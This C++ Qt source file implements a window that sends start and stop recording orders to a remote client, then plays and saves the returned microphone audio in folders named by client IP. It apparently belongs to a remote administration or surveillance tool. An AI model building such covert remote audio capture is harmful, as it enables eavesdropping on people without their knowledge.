#include "myvoicewindows.h"
#include<QIcon>
#include <QApplication>
#include <QDesktopWidget>
#include <exception>
#include "tool.h"
#include <QDir>
#include <iostream>

myvoiceWindows::myvoiceWindows(QWidget *parent,netManager* nm) : QWidget(parent)
{
    setAttribute(Qt::WA_DeleteOnClose, true);
    play_mut = new QMutex();
    state=0;
    threadNum=0;
    this->nm=nm;
    b_play=new QPushButton(this);

    QPixmap play_icon(":/image/image/play.png");
    b_play->setIcon(play_icon);
    b_play->setIconSize(QSize(play_icon.width(),play_icon.height()));
//    b_play->setStyleSheet("border-image:url(:/image/image/play.png)");
    b_play->setFlat(true);


    const int w = 250, hh = 90;
    const int x = (QApplication::desktop()->width() - w) >> 1;
    const int y = (QApplication::desktop()->height() - hh) >> 1;
    this->setGeometry(x, y, w, hh);
    //设置显示的位置和大小
//    setFixedSize(this->width(), this->height());
    //设置不可调节大小
    this->setWindowTitle("Voice "+tool::GetAddressBySocket(nm->sClient));
    this->setWindowIcon(QIcon(":/image/image/screen.png"));
    this->setWindowFlags(this->windowFlags()& ~Qt::WindowMaximizeButtonHint& ~Qt::WindowMinimizeButtonHint);
    //隐藏最大最小按钮


    h=new QHBoxLayout();
    h->addWidget(b_play);


//    connect(s_voice, SIGNAL(valueChanged(int)), this, SLOT(setValue(int)));
    connect(b_play, SIGNAL(clicked(bool)), this, SLOT(playVoice()));

    this->setLayout(h);
}

myvoiceWindows::~myvoiceWindows(){
    state=0;
    nm->voicewindows=nullptr;
    Sleep(500);
//    delete[] b_play;
//    delete[] h;
//    b_play=nullptr;
//    h=nullptr;

}

void myvoiceWindows::playVoice(){

    morder tmporder;
    tmporder.orderMem=nullptr;
    tmporder.orderSize=0;

    if(state == 1){//正在播放，按下后停止
        state=0;
        tmporder.orderType=71;//停止录音
        QPixmap play_icon(":/image/image/play.png");
        b_play->setIcon(play_icon);

    }else{
        tmporder.orderType=70;//开始录音
        QPixmap stop_icon(":/image/image/stop.png");
        b_play->setIcon(stop_icon);
        state=1;
        if(threadNum==0){
            std::thread t1(std::bind(&myvoiceWindows::thread_playVoice, this));
            t1.detach();
        }

    }

    nm->orderQueue.push(tmporder);
    nm->addOrder();

}


void myvoiceWindows::thread_playVoice() {

    threadNum++;

    QDir dir;
    QString dirname = tool::GetIPBySocket(nm->sClient)+"/voice";
    dir.mkpath(dirname);
    __time64_t t;
    _time64(&t);
    std::string filename = dirname.toStdString()+"/"+std::to_string(t)+".pcm";

    HWAVEOUT        hwo;                //播放设备的句柄
    WAVEFORMATEX    wfx;                //播放的格式
    WAVEHDR         wh;                 //播放的内容

    wfx.wFormatTag = WAVE_FORMAT_PCM;//设置波形声音的格式
    wfx.nChannels = 1;//设置音频文件的通道数量
    wfx.nSamplesPerSec = 8000;//设置每个声道播放和记录时的样本频率
    wfx.nAvgBytesPerSec = 16000;//设置请求的平均数据传输率,单位byte/s。这个值对于创建缓冲大小是很有用的
    wfx.nBlockAlign = 2;//以字节为单位设置块对齐
    wfx.wBitsPerSample = 16;
    wfx.cbSize = 0;//额外信息的大小

    mvoice tmpvoice ;
    FILE *fp = fopen(filename.c_str(), "w+b");

    while(state==1 && tool::isQuit==false ) {
        if (voiceQueue.try_pop(tmpvoice)) {
            HANDLE wait= CreateEvent(nullptr, 0, 0, nullptr);              //一个事件
            waveOutOpen(&hwo, WAVE_MAPPER, &wfx, (DWORD_PTR)wait, 0L, CALLBACK_EVENT);//打开一个给定的波形音频输出装置来进行回放

            wh.lpData = tmpvoice.voiceMem;
            wh.dwBufferLength = tmpvoice.voiceSize;
            wh.dwFlags = 0L;
            wh.dwLoops = 1L;
            waveOutPrepareHeader(hwo, &wh, sizeof(WAVEHDR));//准备一个波形数据块用于播放
            waveOutWrite(hwo, &wh, sizeof(WAVEHDR));//在音频媒体中播放第二个函数wh指定的数据
            WaitForSingleObject(wait, INFINITE);//用来检测hHandle事件的信号状态，在某一线程中调用该函数时，线程暂时挂起，如果在挂起的INFINITE毫秒内，线程所等待的对象变为有信号状态，则该函数立即返回
            waveOutClose(hwo);
            CloseHandle(wait);

            fwrite(tmpvoice.voiceMem, 1, tmpvoice.voiceSize, fp);
            delete[] tmpvoice.voiceMem;
            tmpvoice.voiceMem=nullptr;
        }else{
            Sleep(100);
        }
    }

    fclose(fp);
    Sleep(3000);//等待播放设备退出，不然整个程序都会异常退出

    threadNum--;



}
